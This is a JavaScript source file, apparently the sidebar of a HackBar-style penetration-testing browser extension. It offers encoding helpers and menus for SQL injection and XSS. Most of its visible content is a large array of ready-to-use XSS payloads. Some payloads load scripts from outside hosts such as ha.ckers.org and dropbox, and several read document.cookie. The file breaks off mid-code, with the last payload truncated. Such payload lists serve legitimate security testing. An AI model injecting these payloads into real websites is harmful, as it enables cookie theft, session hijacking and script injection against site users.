var myWindowId;

/**** Manage data between tabs ****/

var urlfield = document.querySelector(".urlfield");
var postdatafield = document.querySelector(".postdatafield");
var refererfield = document.querySelector(".refererfield");

/* When the user mouses out, save the current contents of the box. */
window.addEventListener("mouseout", () => {
  // urlfield.setAttribute("contenteditable", false);
  // postdatafield.setAttribute("contenteditable", false);
  // refererfield.setAttribute("contenteditable", false);
  browser.tabs.query({windowId: myWindowId, active: true}).then((tabs) => {
    let contentToStore = {};
    let arraycontent = {};
    arraycontent[0] = urlfield.value;
    arraycontent[1] = postdatafield.value;
    arraycontent[2] = refererfield.value;
    contentToStore[tabs[0].url] = arraycontent;
    browser.storage.local.set(contentToStore);
  });
});

/* Update the sidebar's content. */
function updateContent() {
  browser.tabs.query({windowId: myWindowId, active: true})
    .then((tabs) => {
      return browser.storage.local.get(tabs[0].url);
    })
    .then((storedInfo) => {
      if(storedInfo[Object.keys(storedInfo)[0]])
      {
        urlfield.value = storedInfo[Object.keys(storedInfo)[0]][0];
        postdatafield.value = storedInfo[Object.keys(storedInfo)[0]][1];
        refererfield.value = storedInfo[Object.keys(storedInfo)[0]][2];
      }
    });
}

document.getElementById("rep_btn").onclick = function (){
	//console.log("sdsd");
	var txt=document.getElementById("marea").value;
	//prompt('sdsdsdsaaf');
	var Taleft = document.getElementsByName("taleft")[0].value;
	var Taright = document.getElementsByName("taright")[0].value;
	var Checkbox1 = document.getElementsByName("replaceall")[0];

	if(Checkbox1.checked) {
    	txt=txt.split(Taleft).join(Taright);
    	alert("Sss");
	} 
	else {
    	txt=txt.replace(Taleft,Taright);
	}
	document.getElementById("marea").value=txt;
}
document.getElementById("hex_leftarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = Encrypt.hexToStr(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}
document.getElementById("hex_rightarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = Encrypt.strToHex(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}
document.getElementById("url_leftarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = unescape(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}
document.getElementById("url_rightarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = Encrypt.urlencode(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}
document.getElementById("base_leftarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = Encrypt.base64Decode(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}
document.getElementById("base_rightarrow").onclick=function(){
	var txtarea=document.getElementById("marea");
	var txt=txtarea.value;
    var start = txtarea.selectionStart;
    var finish = txtarea.selectionEnd;
    var sel = txtarea.value.substring(start, finish);
    var newString = Encrypt.base64Encode(sel);
    document.getElementById("marea").value=txt.replace(sel,newString);
}


/* Update content when a new tab becomes active. */
browser.tabs.onActivated.addListener(updateContent);

/* Update content when a new page is loaded into a tab. */
browser.tabs.onUpdated.addListener(updateContent);

/* When the sidebar loads, get the ID of its window, and update its content. */
browser.windows.getCurrent({populate: true}).then((windowInfo) => {
  myWindowId = windowInfo.id;
  updateContent();
});

/**** Main Process  ***/

var loadurlBtn = document.querySelector('.loadurl');
var splitBtn = document.querySelector('.split');
var executeBtn = document.querySelector('.execute');

// Menus
var encryptionMenuBtn = document.getElementsByName("encryptionmenu")[0];
var encodingMenuBtn = document.getElementsByName("encodingmenu")[0];
var otherMenuBtn = document.getElementsByName("othermenu")[0];
var xssMenuBtn = document.getElementsByName("xssmenu")[0];
var sqlMenuBtn = document.getElementsByName("sqlmenu")[0];

// Encoding
var b64encodeBtn = document.getElementsByName("base64encode")[0];
var b64decodeBtn = document.getElementsByName("base64decode")[0];
var urlencodeBtn = document.getElementsByName("urlencode")[0];
var urldecodeBtn = document.getElementsByName("urldecode")[0];
var hexencodeBtn = document.getElementsByName("hexencode")[0];
var hexdecodeBtn = document.getElementsByName("hexdecode")[0];
var binaryencodeBtn = document.getElementsByName("binaryencode")[0];
var binarydecodeBtn = document.getElementsByName("binarydecode")[0];

// Encryption
var md5hashBtn = document.getElementsByName("md5hash")[0];
var sha1hashBtn = document.getElementsByName("sha1hash")[0];
var sha256hashBtn = document.getElementsByName("sha256hash")[0];
var rot13Btn = document.getElementsByName("rot13")[0];

// Other
var stripspacesBtn = document.getElementsByName("stripspaces")[0];
var stripslashesBtn = document.getElementsByName("stripslashes")[0];
var extractlinksBtn = document.getElementsByName("extractlinks")[0];
var strreverseBtn = document.getElementsByName("strreverse")[0];
var extractcommentsBtn = document.getElementsByName("extractcomments")[0];
var extractregexpBtn = document.getElementsByName("extractregexp")[0];
var stripcustomBtn = document.getElementsByName("stripcustom")[0];

// XSS
var strcharcodeBtn = document.getElementsByName("strcharcode")[0];
var htmlcharsBtn = document.getElementsByName("htmlchars")[0];
var xssalertBtn = document.getElementsByName("xssalert")[0];
var autoxsspolyBtn = document.getElementsByName("autoxsspoly")[0];
var autoxsscustomBtn = document.getElementsByName("autoxsscustom")[0];

// SQL BASIC
var mysqlcharBtn = document.getElementsByName("mysqlchar")[0];
var mssqlcharBtn = document.getElementsByName("mssqlchar")[0];
var oraclecharBtn = document.getElementsByName("oraclechar")[0];
//var unionselectstmntBtn = document.getElementsByName("unionselectstmnt")[0];
//var spaces2commentsBtn = document.getElementsByName("spaces2comments")[0];
var postdataCbx = document.getElementsByName("enablepostdata")[0];
var refererCbx = document.getElementsByName("enablereferer")[0];
var currentFocusField = null;
var convUtf = document.getElementsByName("convutf")[0];
var convLat = document.getElementsByName("convlat")[0];
var casT = document.getElementsByName("cast")[0];
var unHex = document.getElementsByName("unhx")[0];
var unCmp = document.getElementsByName("uncmp")[0];
var pluS = document.getElementsByName("plus")[0];
var commT = document.getElementsByName("comment")[0];
var clR = document.getElementsByName("clr")[0];
var ciT = document.getElementsByName("cit")[0];
var ciS = document.getElementsByName("cis")[0];
var collSet = document.getElementsByName("coll-set")[0];
var hostName = document.getElementsByName("hn")[0];
var innoDb = document.getElementsByName("inndb")[0];
var operatorS = document.getElementsByName("opertrs")[0];
var portSql = document.getElementsByName("portsql")[0];
var recoverOption = document.getElementsByName("recoption")[0];
var serverOsType = document.getElementsByName("sot")[0];
var sysLink = document.getElementsByName("syml")[0];
var timeoutConn = document.getElementsByName("toc")[0];
var timeoutWait = document.getElementsByName("tow")[0];
var lpaD = document.getElementsByName("lpad")[0];
var repE = document.getElementsByName("repe")[0];
var ifS = document.getElementsByName("ifs")[0];
var csW = document.getElementsByName("csw")[0];

//Union Based
 var orderBy1 = document.getElementsByName("ob1")[0];
 var groupBy1 = document.getElementsByName("gb1")[0];
 var procAnalyze1 = document.getElementsByName("pa1")[0];
 var selectFromSelect = document.getElementsByName("s*s1")[0];
 var Int1 =document.getElementsByName("int1")[0];
 var Null1 =document.getElementsByName("null1")[0];
 var Int2 =document.getElementsByName("int2")[0];
 var Udv = document.getElementsByName("udv")[0];
 var Countdb1 = document.getElementsByName("countdb1")[0];
 var Ispriv = document.getElementsByName("ispriv")[0];
 var Msst = document.getElementsByName("msst")[0];
 var Grq = document.getElementsByName("grq")[0];
 var Dn_Groupconc = document.getElementsByName("dn_groupconc")[0];
 var Dn_Oneshot = document.getElementsByName("dn_oneshot")[0];
var Tn_Groupconc = document.getElementsByName("tn_groupconc")[0];
var Tn_Oneshot = document.getElementsByName("tn_oneshot")[0];
var Cn_Groupconc = document.getElementsByName("cn_groupconc")[0];
var Cn_Oneshot = document.getElementsByName("cn_oneshot")[0];
var D_Groupconc = document.getElementsByName("d_groupconc")[0];
var D_Oneshot = document.getElementsByName("d_oneshot")[0];
var Db_Madblood = document.getElementsByName("db_madblood")[0];
var Db_Tpro = document.getElementsByName("db_tpro")[0];
var Db_Zen = document.getElementsByName("db_zen")[0];
var Db_Makmanwaf = document.getElementsByName("db_makmanwaf")[0];
var Db_Trojanwaf = document.getElementsByName("db_trojanwaf")[0];
var Db_Madbloodwaf1 = document.getElementsByName("db_madbloodwaf1")[0];
var Db_Madbloodwaf2 = document.getElementsByName("db_madbloodwaf2")[0];
var Db_Trojbenchmark = document.getElementsByName("db_trojbenchmark")[0];
var Db_Rooth3X49 = document.getElementsByName("db_rooth3x49")[0];
var Db_Replace = document.getElementsByName("db_replace")[0];
var Db_Makman = document.getElementsByName("db_makman")[0];
var Db_Ajkaro = document.getElementsByName("db_ajkaro")[0];
var Db_Zenwaf = document.getElementsByName("db_zenwaf")[0];
var Db_Waf = document.getElementsByName("db_waf")[0];
var Db_Rummy = document.getElementsByName("db_rummy")[0];
var Postgre84 = document.getElementsByName("postgre84")[0];
var Postgre91 = document.getElementsByName("postgre91")[0];
var Postgreall = document.getElementsByName("postgreall")[0];
var Db_Rummy_Zen = document.getElementsByName("db_rummy_zen")[0];
var Db_Names1 = document.getElementsByName("db_names1")[0];
var Db_Count1 = document.getElementsByName("db_count1")[0];
var Pdbtc = document.getElementsByName("pdbtc")[0];
var Pdbcc = document.getElementsByName("pdbcc")[0];
var Idbtc = document.getElementsByName("idbtc")[0];
var Icc = document.getElementsByName("icc")[0];


//Error/double query
var Getversion1 = document.getElementsByName("getversion1")[0];
var Getdb = document.getElementsByName("getdb")[0];
var Gettable1 = document.getElementsByName("gettable1")[0];
var Getcolumn1 = document.getElementsByName("getcolumn1")[0];
var Getdata1 = document.getElementsByName("getdata1")[0];
var Getversion2 = document.getElementsByName("getversion2")[0];
var Gettable2 = document.getElementsByName("gettable2")[0];
var Dios1 = document.getElementsByName("dios11")[0];
var Dios2 = document.getElementsByName("dios12")[0];
var Dios3 = document.getElementsByName("dios13")[0];
var Dios4 = document.getElementsByName("dios14")[0];
var Getversion3 = document.getElementsByName("getversion3")[0];
var Gettable3 = document.getElementsByName("gettable3")[0];
var Dios21 = document.getElementsByName("dios21")[0];
var Dios22 = document.getElementsByName("dios22")[0];
var Dios23 = document.getElementsByName("dios23")[0];
var Dios24 = document.getElementsByName("dios24")[0];
var Dios25 = document.getElementsByName("dios25")[0];
var Dios26 = document.getElementsByName("dios26")[0];
var Dios27 = document.getElementsByName("dios27")[0];
var Dios28 = document.getElementsByName("dios28")[0];
var Dios29 = document.getElementsByName("dios29")[0];
var Getversion4 = document.getElementsByName("getversion4")[0];
var Getdb2 = document.getElementsByName("getdb2")[0];
var Gettable4 = document.getElementsByName("gettable4")[0];
var Getcolumn2 = document.getElementsByName("getcolumn2")[0];
var Getdata2 = document.getElementsByName("getdata2")[0];


//WAF
var Waf1 = document.getElementsByName("waf1")[0];
var Waf2 = document.getElementsByName("waf2")[0];
var Waf3 = document.getElementsByName("waf3")[0];
var Waf4 = document.getElementsByName("waf4")[0];
var Waf5 = document.getElementsByName("waf5")[0];
var Waf_Gett = document.getElementsByName("waf_gett")[0];
var Waf_Getc = document.getElementsByName("waf_getc")[0];
var Waf_Gettos = document.getElementsByName("waf_gettos")[0];
var Waf_Getcos = document.getElementsByName("waf_getcos")[0];

//HTML
var Html0 = document.getElementsByName("html0")[0];
var Html1 = document.getElementsByName("html1")[0];
var Html2 = document.getElementsByName("html2")[0];
var Html3 = document.getElementsByName("html3")[0];
var Html4 = document.getElementsByName("html4")[0];
var Html5 = document.getElementsByName("html5")[0];
var Html6 = document.getElementsByName("html6")[0];
var Html7 = document.getElementsByName("html7")[0];
var Html8 = document.getElementsByName("html8")[0];
var Html9 = document.getElementsByName("html9")[0];
var Html10 = document.getElementsByName("html10")[0];
var Html11 = document.getElementsByName("html11")[0];

//xss
var Xs0 = document.getElementsByName("xs0")[0];
var Xs1 = document.getElementsByName("xs1")[0];
var Xs2 = document.getElementsByName("xs2")[0];
var Xs3 = document.getElementsByName("xs3")[0];
var Xs4 = document.getElementsByName("xs4")[0];
var Xs5 = document.getElementsByName("xs5")[0];
var Xs6 = document.getElementsByName("xs6")[0];
var Xs7 = document.getElementsByName("xs7")[0];
var Xs8 = document.getElementsByName("xs8")[0];
var Xs9 = document.getElementsByName("xs9")[0];
var Xs10 = document.getElementsByName("xs10")[0];
var Xs11 = document.getElementsByName("xs11")[0];
var Xs12 = document.getElementsByName("xs12")[0];
var Xs13 = document.getElementsByName("xs13")[0];
var Xs14 = document.getElementsByName("xs14")[0];
var Xs15 = document.getElementsByName("xs15")[0];
var Xs16 = document.getElementsByName("xs16")[0];
var Xs17 = document.getElementsByName("xs17")[0];
var Xs18 = document.getElementsByName("xs18")[0];
var Xs19 = document.getElementsByName("xs19")[0];
var Xs20 = document.getElementsByName("xs20")[0];
var Xs21 = document.getElementsByName("xs21")[0];
var Xs22 = document.getElementsByName("xs22")[0];
var Xs23 = document.getElementsByName("xs23")[0];
var Xs24 = document.getElementsByName("xs24")[0];
var Xs25 = document.getElementsByName("xs25")[0];
var Xs26 = document.getElementsByName("xs26")[0];
var Xs27 = document.getElementsByName("xs27")[0];
var Xs28 = document.getElementsByName("xs28")[0];
var Xs29 = document.getElementsByName("xs29")[0];
var Xs30 = document.getElementsByName("xs29")[0];
var Xs31 = document.getElementsByName("xs31")[0];
var Xs32 = document.getElementsByName("xs32")[0];
var Xs33 = document.getElementsByName("xs33")[0];
var Xs34 = document.getElementsByName("xs34")[0];
var Xs35 = document.getElementsByName("xs35")[0];
var Xs36 = document.getElementsByName("xs36")[0];
var Xs37 = document.getElementsByName("xs37")[0];
var Xs38 = document.getElementsByName("xs38")[0];
var Xs39 = document.getElementsByName("xs39")[0];
var Xs40 = document.getElementsByName("xs40")[0];
var Xs41 = document.getElementsByName("xs41")[0];
var Xs42 = document.getElementsByName("xs42")[0];
var Xs43 = document.getElementsByName("xs43")[0];
var Xs44 = document.getElementsByName("xs44")[0];
var Xs45 = document.getElementsByName("xs45")[0];
var Xs46 = document.getElementsByName("xs46")[0];
var Xs47 = document.getElementsByName("xs47")[0];
var Xs48 = document.getElementsByName("xs48")[0];
var Xs49 = document.getElementsByName("xs49")[0];
var Xs50 = document.getElementsByName("xs50")[0];
var Xs51 = document.getElementsByName("xs51")[0];
var Xs52 = document.getElementsByName("xs52")[0];
var Xs53 = document.getElementsByName("xs53")[0];
var Xs54 = document.getElementsByName("xs54")[0];
var Xs55 = document.getElementsByName("xs55")[0];
var Xs56 = document.getElementsByName("xs56")[0];
var Xs57 = document.getElementsByName("xs57")[0];
var Xs58 = document.getElementsByName("xs58")[0];
var Xs59 = document.getElementsByName("xs59")[0];
var Xs60 = document.getElementsByName("xs60")[0];
var Xs61 = document.getElementsByName("xs61")[0];
var Xs62 = document.getElementsByName("xs62")[0];
var Xs63 = document.getElementsByName("xs63")[0];
var Xs64 = document.getElementsByName("xs64")[0];
var Xs65 = document.getElementsByName("xs65")[0];
var Xs66 = document.getElementsByName("xs66")[0];
var Xs67 = document.getElementsByName("xs67")[0];
var Xs68 = document.getElementsByName("xs68")[0];
var Xs69 = document.getElementsByName("xs69")[0];
var Xs70 = document.getElementsByName("xs70")[0];
var Xs71 = document.getElementsByName("xs71")[0];
var Xs72 = document.getElementsByName("xs72")[0];
var Xs73 = document.getElementsByName("xs73")[0];
var Xs74 = document.getElementsByName("xs74")[0];
var Xs75 = document.getElementsByName("xs75")[0];
var Xs76 = document.getElementsByName("xs76")[0];
var Xs77 = document.getElementsByName("xs77")[0];
var Xs78 = document.getElementsByName("xs78")[0];
var Xs79 = document.getElementsByName("xs79")[0];
var Xs80 = document.getElementsByName("xs80")[0];
var Xs81 = document.getElementsByName("xs81")[0];
var Xs82 = document.getElementsByName("xs82")[0];
var Xs83 = document.getElementsByName("xs83")[0];
var Xs84 = document.getElementsByName("xs84")[0];
var Xs85 = document.getElementsByName("xs85")[0];
var Xs86 = document.getElementsByName("xs86")[0];
var Xs87 = document.getElementsByName("xs87")[0];
var Xs88 = document.getElementsByName("xs88")[0];
var Xs89 = document.getElementsByName("xs89")[0];
var Xs90 = document.getElementsByName("xs90")[0];
var Xs91 = document.getElementsByName("xs91")[0];
var Xs92 = document.getElementsByName("xs92")[0];
var Xs93 = document.getElementsByName("xs93")[0];
var Xs94 = document.getElementsByName("xs94")[0];
var Xs95 = document.getElementsByName("xs95")[0];
var Xs96 = document.getElementsByName("xs96")[0];
var Xs97 = document.getElementsByName("xs97")[0];
var Xs98 = document.getElementsByName("xs98")[0];
var Xs99 = document.getElementsByName("xs99")[0];
var Xs100 = document.getElementsByName("xs100")[0];
var Xs101 = document.getElementsByName("xs101")[0];
var Xs102 = document.getElementsByName("xs102")[0];
var Xs103 = document.getElementsByName("xs103")[0];
var Xs104 = document.getElementsByName("xs104")[0];
var Xs105 = document.getElementsByName("xs105")[0];
var Xs106 = document.getElementsByName("xs106")[0];
var Xs107 = document.getElementsByName("xs107")[0];
var Xs108 = document.getElementsByName("xs108")[0];
var Xs109 = document.getElementsByName("xs109")[0];
var Xs110 = document.getElementsByName("xs110")[0];
var Xs111 = document.getElementsByName("xs111")[0];
var Xs112 = document.getElementsByName("xs112")[0];
var Xs113 = document.getElementsByName("xs113")[0];
var Xs114 = document.getElementsByName("xs114")[0];
var Xs115 = document.getElementsByName("xs115")[0];
var Xs116 = document.getElementsByName("xs116")[0];
var Xs117 = document.getElementsByName("xs117")[0];
var Xs118 = document.getElementsByName("xs118")[0];
var Xs119 = document.getElementsByName("xs119")[0];
var Xs120 = document.getElementsByName("xs120")[0];
var Xs121 = document.getElementsByName("xs121")[0];
var Xs122 = document.getElementsByName("xs122")[0];
var Xs123 = document.getElementsByName("xs123")[0];
var Xs124 = document.getElementsByName("xs124")[0];
var Xs125 = document.getElementsByName("xs125")[0];
var Xs126 = document.getElementsByName("xs126")[0];
var Xs127 = document.getElementsByName("xs127")[0];
var Xs128 = document.getElementsByName("xs128")[0];

var Link1 = document.getElementsByName("link1")[0];
var Link2 = document.getElementsByName("link2")[0];
var Link3 = document.getElementsByName("link3")[0];
var Link4 = document.getElementsByName("link4")[0];
var Link5 = document.getElementsByName("link5")[0];
var Link6 = document.getElementsByName("link6")[0];
var Link7 = document.getElementsByName("link7")[0];
var Link8 = document.getElementsByName("link8")[0];
var Link9 = document.getElementsByName("link9")[0];
var Link10 = document.getElementsByName("link10")[0];


//footer buttons
var Rep_Btn = document.getElementsByName("rep_btn")[0];

var ar=[
"<script>alert(123);</script> ",
"<ScRipT>alert(\"XSS\");</ScRipT> ",
"<script>alert(123)</script> ",
"<script>alert(\"hellox worldss\");</script> ",
"<script>alert(\"XSS\")</script> ",
"<script>alert(\"XSS\");</script> ",
"<script>alert('XSS')</script> ",
"\"><script>alert(\"XSS\")</script> ",
"<script>alert(/XSS\")</script> ",
"<script>alert(/XSS/)</script> ",
"</script><script>alert(1)</script> ",
"'; alert(1); ",
"')alert(1);// ",
"<ScRiPt>alert(1)</sCriPt> ",
"<IMG SRC=jAVasCrIPt:alert('XSS')> ",
"<IMG SRC=\"javascript:alert('XSS');\"> ",
"<IMG SRC=javascript:alert(&quot;XSS&quot;)> ",
"<IMG SRC=javascript:alert('XSS')> ",
"<img src=xss onerror=alert(1)> ",
"<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00> ",
"<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>' ",
"<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\" ",
"<sVg><scRipt %00>alert&lpar;1&rpar; {Opera} ",
"<img/src=%00 onerror=this.onerror=confirm(1) ",
"<form><isindex formaction=\"javascript&colon;confirm(1)\" ",
"<img src=%00&NewLine; onerror=alert(1)&NewLine; ",
"<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script> ",
"<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ",
"<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"> ",
"<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/ ",
"&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00 ",
"<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\"> ",
"<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/> ",
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script ",
"<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera} ",
"<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"> ",
"<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> ",
"<form><a href=\"javascript:\u0061lert&#x28;1&#x29;\">X ",
"</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror='eval(src)'> ",
"<img/&#09;&#10;&#11; src=~ onerror=prompt(1)> ",
"<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;> ",
"<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a ",
"http://www.google<script .com>alert(document.location)</script ",
"<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a ",
"<img/src=@&#32;&#13; onerror = prompt('&#49;') ",
"<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41; ",
"<script ^__^>alert(String.fromCharCode(49))</script ^__^ ",
"</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-( ",
"&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\"> ",
"<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'> ",
"<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/ ",
"<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'> ",
"<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a> ",
"<script ~~~>alert(0%0)</script ~~~> ",
"<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;> ",
"<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN ",
"<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1) ",
"&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>' ",
"&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera} ",
"<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^ ",
"<div/style=\"width:expression(confirm(1))\">X</div> {IE7} ",
"<iframe/%00/ src=javaSCRIPT&colon;alert(1) ",
"//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>// ",
"/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/> ",
"//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\ ",
"</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style> ",
"<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\"> ",
"</plaintext\></|\><plaintext/onmouseover=prompt(1) ",
"</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28/SCRIPT>",
"<SCRIPT>a=/XSS/alert(a.source)</SCRIPT> ",
'\\\\\";alert(\'XSS\');//',
"</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT> ",
"¼script¾alert(¢XSS¢)¼/script¾ ",
"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"> ",
"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME> ",
"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET> ",
"<TABLE BACKGROUND=\"javascript:alert('XSS')\"> ",
"<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\"> ",
"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"> ",
"<DIV STYLE=\"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029\"> ",
"<DIV STYLE=\"width: expression(alert('XSS'));\"> ",
"<STYLE>@im\port'\ja\vasc\ript:alert(\"XSS\")';</STYLE> ",
"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"> ",
"<XSS STYLE=\"xss:expression(alert('XSS'))\"> ",
"exp/*<A STYLE='no\\xss:noxss(\"*//*\");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'> ",
"<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED> ",
"a=\"get\";b=\"URL(ja\\\"\";c=\"vascr\";d=\"ipt:ale\";e=\"rt('XSS');\\\\\")\";eval(a+b+c+d+e); ",
"<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT> ",
"<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></BODY></HTML> ",
"<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> ",
"<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(123)\">TESTHTML5FORMACTION ",
"<form><button formaction=\"javascript:alert(123)\">crosssitespt ",
"<frameset onload=alert(123)> ",
"<!--<img src=\"--><img src=x onerror=alert(123)//\"> ",
"<style><img src=\"</style><img src=x onerror=alert(123)//\"> ",
"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"> ",
"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"> ",
"<embed src=\"javascript:alert(1)\"> ",
"<? foo=\"><script>alert(1)</script>\"> ",
"<! foo=\"><script>alert(1)</script>\"> ",
"</ foo=\"><script>alert(1)</script>\"> ",
"<script>({0:#0=alert/#0#/#0#(123)})</script> ",
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script> ",
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script> ",
"<script src=\"#\">{alert(1)}</script>;1 ",
"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script> ",
"<svg xmlns=\"#\"><script>alert(1)</script></svg> ",
"<svg onload=\"javascript:alert(123)\" xmlns=\"#\"></svg> ",
"<iframe xmlns=\"#\" src=\"javascript:alert(1)\"></iframe> ",
"+ADw-script+AD4-alert(document.location)+ADw-/script+AD4- ",
"%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4- ",
"+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi- ",
"%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi- ",
"%253cscript%253ealert(document.cookie)%253c/script%253e ",
"“><s”%2b”cript>alert(document.cookie)</script> ",
"“><ScRiPt>alert(document.cookie)</script> ",
"“><<script>alert(document.cookie);//<</script> ",
"foo<script>alert(document.cookie)</script> ",
"<scr<script>ipt>alert(document.cookie)</scr</script>ipt> ",
"%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E ",
"‘; alert(document.cookie); var foo=’ ",
"foo\\\’; alert(document.cookie);//’; ",
"</script><script >alert(document.cookie)</script> ",
"<img src=asdf onerror=alert(document.cookie)> ",
"<BODY ONLOAD=alert(’XSS’)> ",
"<script>alert(1)</script> ",
"\"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script> ",
"<video src=1 onerror=alert(1)> ",
"<audio src=1 onerror=alert(1"
]


/*  add event listeners to buttons */
loadurlBtn.addEventListener('click', loadURL);
executeBtn.addEventListener('click', execute);
splitBtn.addEventListener('click', splitUrl);

urlfield.focus();
currentFocusField = urlfield;
anonClickMenuFunct = function ( event ) { onClickMenu( event ); }
encryptionMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
encodingMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
otherMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
xssMenuBtn.addEventListener('mouseover', onMouseOverMenu, false);
b64encodeBtn.addEventListener('click', anonClickMenuFunct, false);
b64decodeBtn.addEventListener('click', anonClickMenuFunct, false);
urlencodeBtn.addEventListener('click', anonClickMenuFunct, false);
urldecodeBtn.addEventListener('click', anonClickMenuFunct, false);
md5hashBtn.addEventListener('click', anonClickMenuFunct, false);
sha1hashBtn.addEventListener('click', anonClickMenuFunct, false);
sha256hashBtn.addEventListener('click', anonClickMenuFunct, false);
rot13Btn.addEventListener('click', anonClickMenuFunct, false);
hexencodeBtn.addEventListener('click', anonClickMenuFunct, false);
hexdecodeBtn.addEventListener('click', anonClickMenuFunct, false);
